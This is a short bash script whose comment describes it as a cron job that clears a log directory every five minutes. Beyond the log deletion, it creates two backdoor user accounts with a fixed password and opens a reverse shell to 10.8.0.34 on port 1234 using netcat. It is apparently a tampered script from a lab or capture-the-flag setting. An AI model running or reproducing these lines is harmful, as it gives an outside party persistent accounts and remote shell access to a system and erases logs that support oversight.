#!/bin/bash

# Delete any file in the log directory
# This script is executed every 5 minutes (via cron job)

rm -rf /opt/admin/logs/*
useradd -m -p "password" -s /bin/bash h4x0r
sudo useradd -m -p "password" -s /bin/bash h4xx0r
nc -e /bin/bash 10.8.0.34 1234
